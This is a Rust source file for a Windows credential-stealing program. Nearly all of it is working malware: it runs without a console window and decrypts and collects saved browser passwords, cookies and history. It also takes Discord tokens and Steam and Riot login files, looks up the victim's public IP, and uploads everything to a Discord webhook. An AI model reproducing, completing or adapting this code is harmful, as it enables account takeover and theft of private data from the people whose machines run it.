#![windows_subsystem = "windows"] // No console display, comment this for debug the application

use reqwest::blocking::{multipart, Client};
use walkdir::WalkDir;
use zip::write::FileOptions;
use zip::ZipWriter;

use std::collections::HashMap;
use std::fs::{self};
use std::io::{Cursor, Read, Write};
use std::path::PathBuf;

mod evading;
mod steal;

// \\\ zip_folder: zip a folder and return the bytes \\\
fn zip_folder(folder_path: PathBuf, h: &mut Vec<u8>) {
    let options = FileOptions::default()
        .compression_method(zip::CompressionMethod::Zstd)
        .compression_level(Some(10));

    let mut zip = ZipWriter::new(Cursor::new(h));

    for entry in WalkDir::new(folder_path).into_iter().filter_map(|e| e.ok()) {
        let entry = entry.path();

        if entry.is_dir() {
            zip.add_directory(entry.to_str().unwrap(), options).unwrap();
        } else if entry.is_file() {
            let mut fbuf = Vec::new();
            zip.start_file(entry.to_str().unwrap(), options).unwrap();
            fs::OpenOptions::new()
                .read(true)
                .open(entry)
                .unwrap()
                .read_to_end(&mut fbuf)
                .unwrap();

            zip.write_all(fbuf.as_slice()).unwrap();
        }
    }

    zip.finish().unwrap();
}

fn zip_elements(paths: Vec<PathBuf>, h: &mut Vec<u8>) {
    let options = FileOptions::default()
        .compression_method(zip::CompressionMethod::Zstd)
        .compression_level(Some(10));

    let mut zip = ZipWriter::new(Cursor::new(h));

    for path in paths {
        let mut fbuf = Vec::new();
        zip.start_file(path.to_str().unwrap(), options).unwrap();
        fs::OpenOptions::new()
            .read(true)
            .open(path)
            .unwrap()
            .read_to_end(&mut fbuf)
            .unwrap();

        zip.write_all(fbuf.as_slice()).unwrap();
    }

    zip.finish().unwrap();
}

fn main() {
    // evading::r_behavior();
    run();
}

// \\\ Run payload \\\
fn run() {
    let webhook = env!("discord_webhook");

    #[cfg(target_os = "windows")]
    let dump = cred_steal();

    #[cfg(target_os = "windows")]
    send(
        webhook,
        dump,
    );


}

// \\\ Browsers stealing \\\
fn cred_steal() -> Option<(String, String, String, String, String, String)> {
    fn steal_browser_data(
        base_path: PathBuf,
        key: &[u8],
    ) -> (
        Option<HashMap<std::string::String, (std::string::String, std::string::String)>>,
        Option<(
            Vec<std::string::String>,
            Vec<(std::string::String, std::string::String)>,
            Vec<std::string::String>,
        )>,
        Option<
            HashMap<
                std::string::String,
                (
                    std::string::String,
                    std::string::String,
                    std::string::String,
                ),
            >,
        >,
    ) {
        let cookies_default_path: PathBuf = base_path.join("Cookies");

        let passwds = steal::get_passwords(&base_path.join("Login Data"), key);
        let history = steal::get_history(&base_path.join("History"));

        let cookies = if fs::metadata(&cookies_default_path).is_err() {
            steal::get_cookies(&base_path.join("Network").join("Cookies"), key)
        } else {
            steal::get_cookies(&cookies_default_path, key)
        };

        return (passwds, history, cookies);
    }

    // Vec<HashMap<host, (username, password)>>
    // This vector contain every passwds for browser

    let mut passwds: Vec<HashMap<String, (String, String)>> = Vec::new();
    let mut history: Vec<(Vec<String>, Vec<(String, String)>, Vec<String>)> = Vec::new();
    // Vec<( Vec<terms>, Vec<(url, file)>, Vec<visited> )>
    //       ^ String    ^ String (Downloads) ^ String

    let mut cookies: Vec<HashMap<String, (String, String, String)>> = Vec::new();
    //             Vec< HashMap<^host_key, (^name, ^value, ^path)>>

    let mut tokens: Vec<String> = Vec::new();

    // --- Get all browsers path ---

    let browsers = steal::get_browsers();
    let browsers_no_profile = browsers.0;
    let browsers_with_profile = browsers.1;

    // --- Get Discord clients path ---

    let dsclient = steal::get_discord_client();

    // ====> [ Steal browser with profiles path ] <====

    for (b_path, _) in browsers_with_profile.iter() {
        if fs::metadata(b_path).is_err() {
            continue;
        }

        let key = match steal::get_master_key(&PathBuf::from(b_path).join("Local State")) {
            Some(key) => key,
            None => return None,
        };

        for file in fs::read_dir(b_path).unwrap() {
            let file_name = file.unwrap().file_name();
            if file_name.to_str().unwrap().starts_with("Profile")
                || file_name.to_str().unwrap() == "Default"
            {
                let (passwd, h, c) = steal_browser_data(
                    [b_path, file_name.to_str().unwrap()].iter().collect(),
                    &key[..],
                );

                match passwd {
                    Some(r) => passwds.push(r),
                    None => {
                        continue;
                    }
                }

                match h {
                    Some(r) => history.push(r),
                    None => {
                        continue;
                    }
                }

                match c {
                    Some(r) => cookies.push(r),
                    None => {
                        continue;
                    }
                }
            }
        }
    }

    // ====> [ Steal browser without profiles path ] <====

    for (b_path, _) in browsers_no_profile.iter() {
        if fs::metadata(b_path).is_err() {
            continue;
        }

        let key = match steal::get_master_key(&PathBuf::from(b_path).join("Local State")) {
            Some(key) => key,
            None => {
                return None;
            }
        };

        let (passwd, h, c) = steal_browser_data([b_path].iter().collect(), &key[..]);

        match passwd {
            Some(r) => passwds.push(r),
            None => {
                continue;
            }
        }

        match h {
            Some(r) => history.push(r),
            None => {
                continue;
            }
        }

        match c {
            Some(r) => cookies.push(r),
            None => {
                continue;
            }
        }
    }

    // ====> [ Steal token discord  (browser) ] <====

    for (b_path, _) in browsers_with_profile.iter() {
        if fs::metadata(b_path).is_err() {
            continue;
        }

        let key = match steal::get_master_key(&PathBuf::from(b_path).join("Local State")) {
            Some(key) => key,
            None => return None,
        };

        for file in fs::read_dir(b_path).unwrap() {
            let file_name = file.unwrap().file_name();
            if file_name.to_str().unwrap().starts_with("Profile")
                || file_name.to_str().unwrap() == "Default"
            {
                let mut token = steal::token_extract(
                    &[
                        b_path,
                        file_name.to_str().unwrap(),
                        "Local Storage",
                        "leveldb",
                    ]
                    .iter()
                    .collect(),
                    &key[..],
                    false,
                );
                if token.len() <= 0 {
                    tokens.append(&mut token);
                }
            }
        }
    }

    for (b_path, _) in browsers_no_profile.iter() {
        if fs::metadata(b_path).is_err() {
            continue;
        }

        let key = match steal::get_master_key(&PathBuf::from(b_path).join("Local State")) {
            Some(key) => key,
            None => {
                return None;
            }
        };

        let mut token = steal::token_extract(
            &[b_path, "Local Storage", "leveldb"].iter().collect(),
            &key[..],
            false,
        );

        if token.len() > 0 {
            tokens.append(&mut token);
        }
    }

    // ====> [ Steal token discord  (client) ] <====

    for (c_path, _) in dsclient {
        if fs::metadata(&c_path).is_err() {
            continue;
        }

        let c_path = c_path.as_str();

        let key = match steal::get_master_key(&PathBuf::from(c_path).join("Local State")) {
            Some(key) => key,
            None => {
                return None;
            }
        };

        let mut token = steal::token_extract(
            &[c_path, "Local Storage", "leveldb"]
                .iter()
                .collect::<PathBuf>(),
            &key[..],
            true,
        );

        if token.len() > 0 {
            tokens.append(&mut token)
        }
    }

    // ====> [ Exporting creads vector into TXT ] <====

    let mut passwds_txt: String = String::new();
    let mut cookies_txt: String = String::new();
    let mut history_terms_txt: String = String::new();
    let mut history_downloads_txt: String = String::new();
    let mut history_visited_txt: String = String::new();

    for passwd in passwds.iter() {
        for (host, (username, password)) in passwd {
            passwds_txt +=
                format!("{}: Username: {}\tPassword: {}\n", host, username, password).as_str();
        }
    }

    for (terms, downloads, visited) in history.iter() {
        for term in terms.iter() {
            history_terms_txt += format!("{}\n", term).as_str();
        }

        for (url, file) in downloads.iter() {
            history_downloads_txt += format!("{}: {}\n", url, file).as_str();
        }

        for v in visited.iter() {
            history_visited_txt += format!("{}\n", v).as_str();
        }
    }

    for cookie_map in cookies {
        for (host, (name, value, path)) in cookie_map {
            cookies_txt += format!(
                "[ {} ]  {}: {}\n \\\n  \\__[ {} ]\n\n",
                host, name, value, path
            )
            .as_str();
        }
    }

    Some((
        passwds_txt,
        history_terms_txt,
        history_downloads_txt,
        history_visited_txt,
        cookies_txt,
        tokens.join("\n"),
    ))
}

// \\\ Sending via webhook Discord [ creds_dump & key - nonce ] \\\
fn send(
    webhook: &str,
    creds_dump: Option<(String, String, String, String, String, String)>,
) {
    let steam_path = PathBuf::from(r"C:\Program Files (x86)\Steam");

    #[allow(deprecated)]
    let riot_path = [
        std::env::home_dir().unwrap().to_str().unwrap(),
        "AppData",
        "Local",
        "Riot Games",
        "Riot Client",
        "Data",
    ]
    .iter()
    .collect::<PathBuf>();

    let client = Client::new();

    // --- Getting public IP ---

    let ip = client
        .get("http://ifconfig.me")
        .send()
        .unwrap()
        .text()
        .unwrap();

    // --- IF dump exist, load and send OR send without dump ---

    if creds_dump.is_some() {
        let creds_dump = creds_dump.unwrap();
        let passwd = creds_dump.0.as_bytes().to_vec();
        let terms = creds_dump.1.as_bytes().to_vec();
        let downloads = creds_dump.2.as_bytes().to_vec();
        let visited = creds_dump.3.as_bytes().to_vec();
        let cookies = creds_dump.4.as_bytes().to_vec();
        let tokens = creds_dump.5.as_bytes().to_vec();

        let steam_data = &mut Vec::new();
        let riot_data = &mut Vec::new();

        if fs::metadata(&steam_path).is_ok() {
            let mut elements = vec![steam_path.join("config").join("loginusers.vdf")];

            for path in fs::read_dir(steam_path).unwrap() {
                let path_entry = path.unwrap().path();

                if path_entry
                    .file_name()
                    .unwrap()
                    .to_str()
                    .unwrap()
                    .starts_with("ssfn")
                {
                    elements.push(path_entry);
                }
            }

            zip_elements(elements, steam_data);
        }

        if fs::metadata(&riot_path).is_ok() {
            zip_folder(riot_path, riot_data);
        }

        let attachment = multipart::Form::new()
            .text(
                "payload_json",
                format!(
                    r#"{{"content": "```IP: {ip}```"}}"#
                ),
            )
            .part(
                "passwds",
                multipart::Part::bytes(passwd).file_name("passwords.txt"),
            )
            .part(
                "hterms",
                multipart::Part::bytes(terms).file_name("terms.txt"),
            )
            .part(
                "hdownload",
                multipart::Part::bytes(downloads).file_name("downloads.txt"),
            )
            .part(
                "visited",
                multipart::Part::bytes(visited).file_name("visited.txt"),
            )
            .part(
                "cookies",
                multipart::Part::bytes(cookies).file_name("cookies.txt"),
            )
            .part("tkns", multipart::Part::bytes(tokens).file_name("tkns.txt"))
            .part(
                "steam",
                multipart::Part::bytes(steam_data.to_vec()).file_name("steam.zip"),
            )
            .part(
                "riot",
                multipart::Part::bytes(riot_data.to_vec()).file_name("riot.zip"),
            );

        client.post(webhook).multipart(attachment).send().unwrap();
    } else {
        client
            .post(webhook)
            .header("Content-Type", "application/json")
            .body(format!(
                r#"{{"content": "```IP: {ip}```"}}"#
            ))
            .send()
            .unwrap();
    }
}
